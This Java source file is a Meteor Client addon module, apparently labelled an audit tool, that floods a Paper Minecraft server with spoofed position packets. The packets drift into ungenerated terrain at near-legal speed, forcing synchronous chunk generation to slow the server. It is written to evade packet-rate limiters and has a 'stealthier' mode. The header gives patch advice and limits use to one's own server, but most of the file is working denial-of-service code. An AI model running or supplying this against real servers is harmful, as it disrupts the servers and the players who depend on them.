package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

/**
 * AUDIT: Worldgen Crawler (Paper async-chunk / synchronous-generation overload)
 *
 * A REALISTIC, non-op TPS killer that abuses Paper-specific behaviour rather than raw
 * packet spam. Instead of claiming impossible speed (which a decode-time cap rejects
 * cheaply — see extreme-velocity), this drifts the reported position OUTWARD at an
 * almost-legal speed into never-generated terrain, so every step lands in a fresh chunk
 * and forces the server to GENERATE or load it. On Paper, client-driven movement into
 * ungenerated chunks can trigger synchronous generation on the main thread; sustained,
 * that walks TPS down with traffic that never trips a packet-rate limiter.
 *
 * <p>Patterns: LINE_OUT (straight away from origin), SPIRAL (maximises distinct new
 * chunks per distance travelled), RANDOM_WALK (harder to fingerprint as a crawler).
 * Keep the per-packet step near a legal walk (≤ ~1 block) so the server accepts it and
 * actually loads the chunk, rather than setting it back.
 *
 * <p>Patch signal: never generate a chunk synchronously in response to a client movement
 * packet — queue it and hold the player at the last generated position; rate-limit how
 * many NEW chunks a single player can pull per second; cap outward travel into
 * ungenerated terrain per tick.
 *
 * <p>The realism tag, severity, safe first-run intensity and what to watch in logs are
 * printed on activate (see {@link CrashProfiles}). Run against your OWN local server only.
 */
public class WorldgenCrawler extends Module {
    public enum Pattern { LINE_OUT, SPIRAL, RANDOM_WALK }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Pattern> pattern = sgGeneral.add(new EnumSetting.Builder<Pattern>()
        .name("pattern").description("LINE_OUT = straight out; SPIRAL = max distinct new chunks; RANDOM_WALK = stealthier.")
        .defaultValue(Pattern.SPIRAL).build());
    private final Setting<Double> step = sgGeneral.add(new DoubleSetting.Builder()
        .name("step-blocks").description("Blocks advanced per packet. Keep near a legal walk (<=1) so the server accepts it and loads the chunk instead of setting it back.")
        .defaultValue(0.9).range(0.05, 8.0).sliderRange(0.1, 4.0).build());
    private final Setting<Integer> packetsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("Position packets per tick (each advances the crawl).")
        .defaultValue(8).range(1, 200).sliderRange(1, 60).build());
    private final Setting<Boolean> keepY = sgGeneral.add(new BoolSetting.Builder()
        .name("hold-y").description("Keep Y constant (crawl horizontally through fresh chunks).")
        .defaultValue(true).build());

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.").defaultValue(true).build());
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.").defaultValue(true).build());

    private int ticksActive = 0, packetsSent = 0;
    private double cx, cz, y;
    private double angle;      // spiral / direction accumulator
    private double radius;     // spiral radius
    private boolean init;

    public WorldgenCrawler() {
        super(AddonTemplate.CRASH_CATEGORY, "worldgen-crawler",
            "Drifts position outward at legal speed into ungenerated terrain to force synchronous chunk generation. Paper-specific, non-op TPS killer that never trips a packet-rate limiter.");
    }

    @Override
    public void onActivate() {
        ticksActive = packetsSent = 0; init = false; angle = 0; radius = 0;
        cadence.onActivate(); gr.onActivate(this); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!gr.firingAllowed()) return;   // CrashSafety may have aborted
        if (!cadence.shouldFire()) return;
        if (!init) { cx = mc.player.getX(); cz = mc.player.getZ(); y = mc.player.getY(); init = true; }

        int n = gr.scale(packetsPerTick.get());
        double s = step.get();
        for (int i = 0; i < n; i++) {
            switch (pattern.get()) {
                case LINE_OUT -> cx += s;
                case SPIRAL -> {
                    radius += s * 0.02;
                    angle += s / Math.max(1.0, radius);
                    cx += Math.cos(angle) * s;
                    cz += Math.sin(angle) * s;
                }
                case RANDOM_WALK -> {
                    double a = Math.random() * Math.PI * 2;
                    cx += Math.cos(a) * s;
                    cz += Math.sin(a) * s;
                }
            }
            if (!keepY.get()) y = mc.player.getY();
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(cx, y, cz, true, false));
            packetsSent++;
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent, crawled to (%.0f, %.0f).", ticksActive, packetsSent, cx, cz);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
